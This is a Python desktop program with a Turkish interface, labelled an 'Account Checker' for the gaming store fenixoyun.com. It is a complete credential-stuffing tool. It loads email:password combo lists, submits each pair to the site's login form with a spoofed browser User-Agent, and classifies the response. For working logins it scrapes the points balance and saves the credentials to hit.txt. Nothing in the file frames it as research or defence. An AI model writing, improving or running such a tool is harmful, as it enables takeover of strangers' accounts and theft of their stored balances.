import requests
import re
import time
import threading
import customtkinter as ctk
from tkinter import filedialog, messagebox

# --- Arayüz Ayarları ---
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

class FenixCheckerGUI(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("FenixOyun Account Checker v1.0")
        self.geometry("700x550")

        # Değişkenler
        self.input_file_path = ""
        self.is_running = False
        self.hit_count = 0
        self.bad_count = 0
        self.error_count = 0
        self.delay = 1.5

        self.setup_ui()

    def setup_ui(self):
        # Ana Frame
        self.grid_columnconfigure(0, weight=1)
        
        # Başlık
        self.label_title = ctk.CTkLabel(self, text="FENIXOYUN CHECKER", font=ctk.CTkFont(size=24, weight="bold"))
        self.label_title.grid(row=0, column=0, pady=20)

        # Dosya Seçme Alanı
        self.file_frame = ctk.CTkFrame(self)
        self.file_frame.grid(row=1, column=0, padx=20, pady=10, sticky="ew")
        
        self.btn_browse = ctk.CTkButton(self.file_frame, text="Dosya Seç (.txt)", command=self.browse_file)
        self.btn_browse.grid(row=0, column=0, padx=10, pady=10)
        
        self.label_file = ctk.CTkLabel(self.file_frame, text="Henüz dosya seçilmedi...", text_color="gray")
        self.label_file.grid(row=0, column=1, padx=10, pady=10)

        # İstatistik Paneli
        self.stats_frame = ctk.CTkFrame(self)
        self.stats_frame.grid(row=2, column=0, padx=20, pady=10, sticky="ew")
        self.stats_frame.grid_columnconfigure((0,1,2), weight=1)

        self.lbl_hit = ctk.CTkLabel(self.stats_frame, text="HIT: 0", text_color="#2ecc71", font=ctk.CTkFont(size=16, weight="bold"))
        self.lbl_hit.grid(row=0, column=0, pady=10)

        self.lbl_bad = ctk.CTkLabel(self.stats_frame, text="BAD: 0", text_color="#e74c3c", font=ctk.CTkFont(size=16, weight="bold"))
        self.lbl_bad.grid(row=0, column=1, pady=10)

        self.lbl_err = ctk.CTkLabel(self.stats_frame, text="ERROR: 0", text_color="#f1c40f", font=ctk.CTkFont(size=16, weight="bold"))
        self.lbl_err.grid(row=0, column=2, pady=10)

        # Log Ekranı
        self.log_text = ctk.CTkTextbox(self, width=600, height=200)
        self.log_text.grid(row=3, column=0, padx=20, pady=10, sticky="nsew")

        # Kontrol Butonları
        self.control_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.control_frame.grid(row=4, column=0, pady=20)

        self.btn_start = ctk.CTkButton(self.control_frame, text="BAŞLAT", fg_color="#27ae60", hover_color="#219150", command=self.start_checking)
        self.btn_start.grid(row=0, column=0, padx=10)

        self.btn_stop = ctk.CTkButton(self.control_frame, text="DURDUR", fg_color="#c0392b", hover_color="#a93226", command=self.stop_checking, state="disabled")
        self.btn_stop.grid(row=0, column=1, padx=10)

    def browse_file(self):
        file = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file:
            self.input_file_path = file
            self.label_file.configure(text=file.split("/")[-1], text_color="white")

    def log(self, message):
        self.log_text.insert("end", f"[{time.strftime('%H:%M:%S')}] {message}\n")
        self.log_text.see("end")

    def try_login(self, email, password):
        session = requests.Session()
        headers_get = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/128.0.0.0",
        }

        try:
            session.get("https://fenixoyun.com/giris", headers=headers_get, timeout=10)
            ocsessid = session.cookies.get("OCSESSID")
            if not ocsessid: return "ERROR", "Cookie alınamadı"

            login_data = {"email": (None, email.strip()), "password": (None, password.strip())}
            headers_post = {
                "Referer": "https://fenixoyun.com/giris",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/128.0.0.0",
                "Cookie": f"OCSESSID={ocsessid}; language=tr-tr;",
            }

            resp = session.post("https://fenixoyun.com/giris", data=login_data, headers=headers_post, timeout=12)
            html = resp.text.lower()

            if "e-posta adresiniz ya da parolanız yanlış!" in html:
                return "BAD", None
            
            if "siparişlerim" in html:
                bakiye = "Bulunamadı"
                match = re.search(r'puan bakiyeniz</div><div class="fx-points-value">(.*?)</div>', resp.text, re.IGNORECASE | re.DOTALL)
                if match: bakiye = match.group(1).strip()
                return "HIT", bakiye
            
            return "UNKNOWN", None
        except Exception as e:
            return "ERROR", str(e)

    def worker(self):
        try:
            with open(self.input_file_path, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
        except Exception as e:
            self.log(f"Hata: {e}")
            return

        for line in lines:
            if not self.is_running: break
            line = line.strip()
            if ":" not in line: continue

            email, password = line.split(":", 1)
            status, info = self.try_login(email, password)

            if status == "HIT":
                self.hit_count += 1
                self.lbl_hit.configure(text=f"HIT: {self.hit_count}")
                self.log(f"HIT ✓ {email} | Bakiye: {info}")
                with open("hit.txt", "a", encoding="utf-8") as f_hit:
                    f_hit.write(f"HIT | {email}:{password} | Bakiye: {info}\n")
            elif status == "BAD":
                self.bad_count += 1
                self.lbl_bad.configure(text=f"BAD: {self.bad_count}")
            else:
                self.error_count += 1
                self.lbl_err.configure(text=f"ERROR: {self.error_count}")
                self.log(f"Hata: {email} -> kulllanıcı adı veya şifreyi yanlış")

            time.sleep(self.delay)

        self.log("İşlem bitti.")
        self.stop_checking()

    def start_checking(self):
        if not self.input_file_path:
            messagebox.showwarning("Uyarı", "Lütfen önce bir dosya seçin!")
            return
        
        self.is_running = True
        self.btn_start.configure(state="disabled")
        self.btn_stop.configure(state="normal")
        self.log("Checker başlatıldı...")
        
        # UI'ı dondurmamak için thread kullanıyoruz
        thread = threading.Thread(target=self.worker, daemon=True)
        thread.start()

    def stop_checking(self):
        self.is_running = False
        self.btn_start.configure(state="normal")
        self.btn_stop.configure(state="disabled")
        self.log("Checker durduruldu.")

if __name__ == "__main__":
    app = FenixCheckerGUI()
    app.mainloop()
